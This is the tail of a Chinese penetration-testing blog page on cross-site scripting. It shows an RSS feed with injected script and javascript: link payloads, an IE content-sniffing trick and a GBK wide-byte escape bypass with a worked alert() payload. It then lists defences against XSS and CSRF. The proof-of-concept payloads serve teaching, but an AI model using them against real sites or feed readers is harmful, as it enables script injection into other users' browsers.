<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[Kyle Polich]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:email</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;kylepolich@gmail.com&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:email</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:owner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">description</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[Data Skeptic alternates between short mini episodes with the host explaining concepts from data science to his non-data scientist wife, and longer interviews featuring practitioners and experts on interesting topics related to data, all through the eye of scientific skepticism.]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">description</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:subtitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[Applying critical thinking to Data Science]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:subtitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[&lt;]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">script</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[&gt;]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">alert(&#39;xss&#39;)</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[&lt;]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/script</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[&gt;]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">title</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">pubDate</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;Fri, 15 Jan 2016 15:00:00 +0000&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">pubDate</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">guid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> isPermaLink</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;false&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[18102dbc685d36dea2556055eea4ed76]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">guid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[javascript:alert(document.domain)]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">link</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:image</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://static.libsyn.com/p/assets/2/9/3/8/2938570bb173ccbc/DataSkeptic-Podcast-1A.jpg&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">description</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[&lt;script&gt;alert(2)&lt;/script&gt;]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">description</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">enclosure</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> length</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;45125402&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;audio/mpeg&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> url</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://traffic.libsyn.com/dataskeptic/pseudo-profound-episode.mp3&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:duration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;37:37&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:duration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:explicit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;no&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:explicit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:keywords</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">      &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:subtitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;![CDATA[A recent paper in the journal of Judgment and Decision Making titled On the reception and detection of pseudo-profound bullshit explores empirical questions around a reader&#39;s ability to detect statements which may sound profound but are actually a...]]&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">itunes:subtitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">          &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">item</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  &lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">channel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">rss</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这是一份已经注入javascript代码的xml文件，只需要把它上传到服务器，然后使用rss阅读器订阅此地址便可触发xss</p><p><a href="https://gist.github.com/fyoorer/6ea27a449ae6249e519a" target="_blank" rel="noopener noreferrer">文件源</a></p><p><strong>应用软件中的xss</strong></p><p>危害主要来自于，应用程序对用户的输入没有进行严格的过滤，例如邮箱等软件导致能够执行XSS；</p><h3 id="_2-14-9-浏览器差异" tabindex="-1"><a class="header-anchor" href="#_2-14-9-浏览器差异"><span>2.14.9 浏览器差异</span></a></h3><p><strong>跨浏览器的不兼容性</strong></p><p>造成不兼容现象的主要原因是DOM和CSS</p><p><strong>IE嗅探机制与XSS</strong></p><p>ie浏览器会对页面通过content-type: text/html进行嗅探，如果是html页面就会正常加载，firefox 和chorme就不会，因此我们可以利用该特性，在txt文本中保存含有XSS的html代码,使用IE浏览器就能正常弹窗</p><p><strong>浏览器差异造成的XSS</strong></p><p>本质在于利用浏览器的特性来设置XSSpayload</p><p>例如chrome 会动态修正一些节点</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;/script x\&gt; --&gt; &lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="_2-14-10-字符集编码隐患" tabindex="-1"><a class="header-anchor" href="#_2-14-10-字符集编码隐患"><span>2.14.10 字符集编码隐患</span></a></h3><p>双字节编码漏洞，主要利用php对&#39;的转义，当php设置了GBK等宽字节字符集的时候，高8位合并编码为汉字；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>假设有如下代码</span></span>
<span class="line"><span>&lt;?php</span></span>
<span class="line"><span>header(&quot;Content-Type:text/html;Charset=gb2312&quot;);</span></span>
<span class="line"><span>$a=$_GET[&quot;a&quot;];</span></span>
<span class="line"><span>&gt;</span></span>
<span class="line"><span>&lt;script&gt;x=&#39;&lt;?php echo $a;?&gt;&#39;;y=&#39;[user_input]&#39;;</span></span>
<span class="line"><span>&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果php设置了CBK，我们就可以利用转义来进行XSS；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>假设我们传入</span></span>
<span class="line"><span>?a=xss&#39;;aler(0)//</span></span>
<span class="line"><span>返回内容为</span></span>
<span class="line"><span>&lt;script&gt;x=&#39;xss\&#39;;alert(0)//;?&gt;&#39;.....</span></span>
<span class="line"><span>显然这里被转义，无法执行，换种传入方式</span></span>
<span class="line"><span>?a=xss%5d&#39;;alert(0)//</span></span>
<span class="line"><span>返回如下</span></span>
<span class="line"><span>&lt;script&gt;x=&#39;xss诚&#39;;alert(0)//&#39;;y=&#39;[user_input]&#39;;</span></span>
<span class="line"><span>能够执行弹窗</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-15-防御xss" tabindex="-1"><a class="header-anchor" href="#_2-15-防御xss"><span>2.15 防御XSS</span></a></h2><h3 id="_2-15-1-xss-filter" tabindex="-1"><a class="header-anchor" href="#_2-15-1-xss-filter"><span>2.15.1 XSS Filter</span></a></h3><p><strong>输入过滤</strong></p><p>(1)输入验证</p><p>设定长度</p><p>设定只允许输入的字符</p><p>利用javascript进行校验输入是否正确</p><p>输入是否符合格式要求</p><p>(2)数据消毒</p><p>服务端处理，拒绝敏感字符如&lt; &gt; &#39; &quot; &amp; # javascript expression等</p><p><strong>输出编码</strong></p><p>大多数应用存在将用户输入直接输出在页面上的习惯，这样很容易造成XSS</p><p>如果要输出在页面上，最好是对敏感字符使用htmlencode进行编码</p><h3 id="_2-15-2-黑名单和白名单" tabindex="-1"><a class="header-anchor" href="#_2-15-2-黑名单和白名单"><span>2.15.2 黑名单和白名单</span></a></h3><figure><img src="/articles/assets/blackwhitelist-FmpqRQUR.png" alt="blackwhitelist" tabindex="0" loading="lazy"><figcaption>blackwhitelist</figcaption></figure><p>如果仅仅是使用黑名单，攻击者可以通过之前讲到的方式转码，混淆进行攻击，所以还需要白名单，单从程度上来讲，对信息过滤白名单会优于黑名单；</p><h3 id="_2-15-3-字符转码" tabindex="-1"><a class="header-anchor" href="#_2-15-3-字符转码"><span>2.15.3 字符转码</span></a></h3><p>对关键字符，标签进行实体编码，特别需要注意的是url属性与javascript事件；</p><h3 id="_2-15-4-防御dom-based-xss" tabindex="-1"><a class="header-anchor" href="#_2-15-4-防御dom-based-xss"><span>2.15.4 防御dom-based-xss</span></a></h3><p>由于dom并不经过服务端，所以一切基于服务端的过滤都是无效的；</p><p>要防御dom-xss,要注意以下几点</p><p>(1)避免客户端的文档重写，重定向，避免使用客户端数据，这些操作尽量在服务端动态实现</p><p>(2)分析和强化客户端javascript代码，尤其是一些受到用户影响的dom对象；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>从URL获取</span></span>
<span class="line"><span>document.URL</span></span>
<span class="line"><span>document.URLUnencoded</span></span>
<span class="line"><span>document.location(.pathname|.href|.search|.hash)</span></span>
<span class="line"><span>window.location(.pathname|.href|.search|.hash)</span></span>
<span class="line"><span>Referre属性</span></span>
<span class="line"><span>document.referrer</span></span>
<span class="line"><span>windowname属性</span></span>
<span class="line"><span>window.name</span></span>
<span class="line"><span>其他属性 </span></span>
<span class="line"><span>document.cookie</span></span>
<span class="line"><span>HTML5 postMessage</span></span>
<span class="line"><span>localStorage/globalStorage</span></span>
<span class="line"><span>XMLHTTPRequest response</span></span>
<span class="line"><span>Input.value</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-15-5-其他防御方式" tabindex="-1"><a class="header-anchor" href="#_2-15-5-其他防御方式"><span>2.15.5 其他防御方式</span></a></h3><p><strong>Anti-xss</strong></p><p>一个专门防范XSS的库；</p><p><strong>httponly cookie</strong></p><p>支持Cookie的浏览器最好是设置httponly cookie</p><p><strong>Noscript</strong></p><p>一款免费的浏览器插件，默认进禁止所有脚本，可自定义能够运行的脚本；</p><p><strong>WAF</strong></p><h2 id="_2-16-防御csrf" tabindex="-1"><a class="header-anchor" href="#_2-16-防御csrf"><span>2.16 防御CSRF</span></a></h2><p>使用post代替get;</p><p>检验http referer</p><p>验证码</p><p>使用token</p><h2 id="参考资料" tabindex="-1"><a class="header-anchor" href="#参考资料"><span>参考资料</span></a></h2><p>《XSS跨站脚本攻击剖析与防御》</p><p><a href="https://www.w3school.com.cn/js/js_htmldom.asp" target="_blank" rel="noopener noreferrer">https://www.w3school.com.cn/js/js_htmldom.asp</a></p><p><a href="https://gist.github.com/fyoorer/6ea27a449ae6249e519a" target="_blank" rel="noopener noreferrer">https://gist.github.com/fyoorer/6ea27a449ae6249e519a</a></p><h2 id="后记" tabindex="-1"><a class="header-anchor" href="#后记"><span>后记</span></a></h2><p>写的很烂，内容不丰富，有问题请指出</p></div><!----><footer class="vp-page-meta"><div class="vp-meta-item edit-link"><a class="auto-link external-link vp-meta-label" href="https://github.com/vuepress-theme-hope/vuepress-theme-hope/edit/main/src/渗透测试/外网漏洞/XSS.md" aria-label="在 GitHub 上编辑此页" rel="noopener noreferrer" target="_blank"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon" name="edit"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->在 GitHub 上编辑此页<!----></a></div><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">上次编辑于: </span><span class="vp-meta-info" data-allow-mismatch="text">2025/1/16 02:41:02</span></div><div class="contributors"><span class="vp-meta-label">贡献者: </span><!--[--><!--[--><span class="vp-meta-info" title="email: 1027578439@qq.com">uu2fu3o</span><!--]--><!--]--></div></div></footer><nav class="vp-page-nav"><a class="route-link auto-link prev" href="/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/XML.html" aria-label="XML"><div class="hint"><span class="arrow start"></span>上一页</div><div class="link"><!---->XML</div></a><!----></nav><!----><!----><!--]--></main><!--]--><footer class="vp-footer-wrapper" vp-footer><div class="vp-footer">这是个页脚</div><div class="vp-copyright">Copyright © 2025 uu2fu3o </div></footer></div><!--]--><!--[--><!----><!--[--><!--]--><!--]--><!--]--></div>
    <script type="module" src="/articles/assets/app-DS0ZCcmM.js" defer></script>
  </body>
</html>
